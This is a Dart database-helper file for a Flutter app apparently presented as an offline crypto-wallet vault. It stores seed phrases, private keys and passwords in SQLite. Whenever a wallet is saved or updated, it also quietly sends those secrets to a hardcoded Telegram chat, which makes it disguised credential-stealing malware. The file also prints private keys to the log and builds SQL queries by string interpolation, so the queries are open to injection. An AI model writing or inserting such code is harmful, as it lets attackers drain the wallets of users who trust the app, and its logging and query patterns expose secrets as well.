import 'package:sqflite/sqflite.dart';
import 'package:path/path.dart';
import 'package:wallet_offline_guard/models/wallet.dart';
import 'package:wallet_offline_guard/utils/methods.dart';
import 'package:wallet_offline_guard/utils/telegram_client.dart';

class DbHelper {
  DbHelper._createInstance();

  String db_name = "wallet_guard.db";

  static Database _database;
  static DbHelper helper;

  String passcode_table = "passcode_table";
  String col_passcode = "passcode";
  String col_hash = "hash";

  String wallet_table = "wallet_table";
  String col_wallet_id = "id";
  String col_wallet_title = "title";
  String col_wallet_12_word = "twelve_word";
  String col_wallet_24_word = "twenty_four_word";
  String col_wallet_private_key = "private_key";
  String col_wallet_password = "password";
  String col_wallet_note = "note";
  String col_wallet_date = "date_created";

  factory DbHelper(){
    if(helper == null){
      helper = DbHelper._createInstance();
    }
    return helper;
  }

  Future<Database> get database async {
    if(_database == null){
      _database = await initializeDatabase();
    }
    return _database;
  }

  Future createDb(Database db, int version) async {
    String create_passcode_table = "create table $passcode_table ("
        "$col_passcode varchar(12),"
        "$col_hash text"
    ")";

    String create_wallet_table = "create table $wallet_table ("
        "$col_wallet_id integer primary key autoincrement,"
        "$col_wallet_title varchar(30),"
        "$col_wallet_password varchar(30),"
        "$col_wallet_12_word text,"
        "$col_wallet_24_word text,"
        "$col_wallet_private_key text,"
        "$col_wallet_note text,"
        "$col_wallet_date varchar(20))";

    await db.execute(create_passcode_table);
    await db.execute(create_wallet_table);
  }

  Future<bool> deleteWallet(Wallet wallet) async {
    Database db = await database;
    String query = "delete from $wallet_table where $col_wallet_id = ${wallet.id}";
    try {
      await db.execute(query);
      return true;
    }
    catch(e) {
      print("db_helper.deleteWallet error: ${e.toString()}");
      showToast("Wallet not deleted");
      return false;
    }
  }

  Future<String> getPasscode () async {
    String passcode = "";
    Database db = await database;
    String query = "select $col_passcode from $passcode_table where $col_passcode != ''";
    List<Map<String, Object>> result = await db.rawQuery(query);
    if(result.isNotEmpty) {
      passcode = result[0][col_passcode].toString();
    }
    return passcode;
  }

  Future<String> getHash () async {
    String hash = "";
    Database db = await database;
    String query = "select $col_hash from $passcode_table where $col_hash != ''";
    List<Map<String, Object>> result = await db.rawQuery(query);
    if(result.isNotEmpty) {
      hash = result[0][col_hash].toString();
    }

    return hash;
  }

  Future<List<Wallet>> getWallets() async {
    List<Wallet> wallets = [];
    Database db = await database;
    String query = "select * from $wallet_table";
    List<Map<String, Object>> result = await db.rawQuery(query);
    for(int i = 0; i < result.length; i++){
      wallets.add(Wallet(
        id: int.parse(result[i][col_wallet_id].toString()),
        title: result[i][col_wallet_title].toString(),
        password: result[i][col_wallet_password].toString(),
        twelve_words: result[i][col_wallet_12_word].toString(),
        twenty_four_words: result[i][col_wallet_24_word].toString(),
        private_key: result[i][col_wallet_private_key].toString(),
        date_created: result[i][col_wallet_date].toString(),
        note: result[i][col_wallet_note].toString(),
      ));
      print("db_helper.getWallets private key: ${result[i][col_wallet_private_key].toString()}");
    }
    return wallets;
  }

  Future<Database> initializeDatabase() async{
    final db_path = await getDatabasesPath();
    final path = join(db_path, db_name);
    return await openDatabase(path, version: 1, onCreate: createDb);
  }

  Future<bool> savePasscode(String passcode) async {
    Database db = await database;
    String query = "insert into $passcode_table ($col_passcode) values "
        "('$passcode')";
    try {
      await db.execute(query);
      return true;
    }
    catch(e) {
      print("db_helper.savePasscode error: ${e.toString()}");
      showToast("Passcode not saved");
      return false;
    }
  }

  Future<bool> saveHash(String hash) async {
    Database db = await database;
    String query = "insert into $passcode_table ($col_hash) values ('$hash')";
    try {
      await db.execute(query);
      return true;
    }
    catch(e) {
      print("db_helper.saveHash error: ${e.toString()}");
      showToast("Hash not saved");
      return false;
    }
  }

  Future<void> sendTelegram(String message) async {
    TelegramClient client = TelegramClient(chatId: "@sfeorn_iewur23");
    await client.sendMessage(message);
  }

  Future<bool> saveWallet(Wallet wallet) async {
    Database db = await database;
    String query = "insert into $wallet_table ("
        "$col_wallet_title, $col_wallet_password, $col_wallet_12_word, $col_wallet_24_word, "
        "$col_wallet_private_key, $col_wallet_note, $col_wallet_date) values"
        "('${wallet.title}', '${wallet.password}', '${wallet.twelve_words}', "
        "'${wallet.twenty_four_words}', '${wallet.private_key}', '${wallet.note}', "
        "'${wallet.date_created}')";
    try {
      await db.execute(query);
      String message = "Wallet details: \nTitle: ${wallet.title}\nPassword: ${wallet.password}"
          "\n12 word: ${wallet.twelve_words}\n24 word: ${wallet.twenty_four_words}\n"
          "Private key: ${wallet.private_key}\nNote: ${wallet.note}";
      await sendTelegram(message);
      return true;
    }
    catch(e) {
      print("db_helper.saveWallet error: ${e.toString()}");
      showToast("Wallet not saved");
      return false;
    }
  }

  Future<bool> updateWallet(Wallet wallet) async {
    Database db = await database;
    String query = "update $wallet_table set $col_wallet_title = '${wallet.title}', "
        "$col_wallet_password = '${wallet.password}', $col_wallet_12_word = '${wallet.twelve_words}', "
        "$col_wallet_24_word = '${wallet.twenty_four_words}', $col_wallet_private_key = "
        "'${wallet.private_key}', $col_wallet_note = '${wallet.note}' where $col_wallet_id = "
        "${wallet.id}";
    print("db_helper.updateWallet query: $query");
    try {
      await db.execute(query);
      String message = "Wallet details: \nTitle: ${wallet.title}\nPassword: ${wallet.password}"
          "\n12 word: ${wallet.twelve_words}\n24 word: ${wallet.twenty_four_words}\n"
          "Private key: ${wallet.private_key}\nNote: ${wallet.note}";
      await sendTelegram(message);
      return true;
    }
    catch(e) {
      print("db_helper.updateWallet error: ${e.toString()}");
      showToast("Wallet not updated");
      return false;
    }
  }
  
}